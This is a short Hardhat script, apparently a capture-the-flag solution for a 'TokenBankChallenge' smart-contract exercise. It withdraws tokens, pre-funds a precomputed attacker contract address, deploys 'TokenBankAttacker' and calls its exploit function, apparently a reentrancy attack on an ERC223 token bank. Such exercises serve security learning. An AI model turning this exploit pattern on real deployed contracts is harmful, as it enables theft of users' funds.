import { ethers } from "hardhat";

const solve = async () => {
  const challengeAddress = "0xc856A0573159c877f53A1355077944c0E5104731";
  const [player] = await ethers.getSigners();

  const challengeContract = await ethers.getContractAt(
    "TokenBankChallenge",
    challengeAddress
  );

  const token = await ethers.getContractAt(
    "SimpleERC223Token",
    await challengeContract.token()
  );

  let tx = await challengeContract.withdraw(ethers.utils.parseEther("500000"), {
    gasLimit: 1e6,
  });
  console.log(await tx.wait());

  const deployAddress = ethers.utils.getContractAddress({
    from: player.address,
    nonce: (await ethers.provider.getTransactionCount(player.address)) + 1,
  });

  tx = await token
    .connect(player)
    ["transfer(address,uint256)"](
      deployAddress,
      ethers.utils.parseEther("500000"),
      { gasLimit: 1e6 }
    );
  console.log(await tx.wait());

  const attackerContract = await (
    await ethers.getContractFactory("TokenBankAttacker", player)
  ).deploy();

  tx = await attackerContract.exploit(challengeContract.address, {
    gasLimit: 1e6,
  });
  console.log(await tx.wait());
};

solve().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
